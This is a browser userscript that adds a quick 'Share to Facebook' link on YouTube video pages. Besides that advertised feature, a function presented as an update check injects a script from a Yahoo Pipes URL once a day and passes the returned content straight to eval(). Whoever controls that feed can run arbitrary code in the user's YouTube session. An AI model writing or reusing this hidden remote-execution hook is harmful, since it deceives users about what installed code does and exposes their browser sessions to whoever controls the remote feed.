(function () {
// ==UserScript==
// @name           Youtube Quick Facebook Sharer
// @namespace      http://www.krakenstein.cz.cc
// @author         daYOda (Krakenstein)
// @description    Zero delay, cut official FB Sharer button, FAST share Youtube video to Facebook, cool!
// @version        1.0
// @include        http://*.youtube.com/*
// @match          http://*.youtube.com/*
// ==/UserScript==

function g(id){if(id&&typeof id==='string'){id=document.getElementById(id);}return id||null;}

const script_id = 93743;
const script_version = '1.0';
const usoUpdCbId = 'YodusoUpdateCallback';
const s_CheckUpdate = 'yodCheckUpdate' + script_id;
const s_servupdt = 'http://pipes.yahoo.com/pipes/pipe.run?_id=7015d15962d94b26823e801048aae95d&_render=json&_callback=YodusoUpdateCallback&';

function setValue(key, value) {
  localStorage.setItem(key, value);
  return false;
}

function getValue(key) {
  var val = localStorage.getItem(key);
  return val;
}

function usoUpdate(el) {
  var md = parseInt(new Date().getDate());
  var CheckUpdate = parseInt(getValue(s_CheckUpdate));
  if (CheckUpdate !== md) {
    setValue(s_CheckUpdate, md);
    el = el ? el : document.body;
    if (el) {
      if (!document.getElementById(usoUpdCbId)) {
        var s_gm = document.createElement('script');
        s_gm.id = usoUpdCbId;
        s_gm.type = 'text/javascript';
        s_gm.innerHTML = 'function YodusoUpdateCallback(itm){return eval(itm.value.items[0].content);}';
        el.appendChild(s_gm);
      }
      var s_gm = document.createElement('script');
      s_gm.type = 'text/javascript';
      s_gm.src = s_servupdt + 'id=' + script_id + '&ver=' + script_version;
      el.appendChild(s_gm);
    }
  }
  else setValue(s_CheckUpdate, md);
}

var target;
if (target = g('watch-info')) {
  var loc = "http://www.facebook.com/sharer.php?u=" + encodeURIComponent(document.location);
  var box = document.createElement("div");
  box.setAttribute('style', 'text-align:center; margin: 20px 0 10px;');
  box.innerHTML = '<span style="font-size: 15px!important; font-weight: bold;">\
    -[ <a href="' + loc + '" target="_blank">Share to Facebook</a> ]-</span><br />\
    <small>more scripts ; <a href="http://krakenstein.cz.cc" target="_blank">krakenstein.cz.cc</a></small>';
  target.parentNode.insertBefore(box, target);
}

usoUpdate();
})();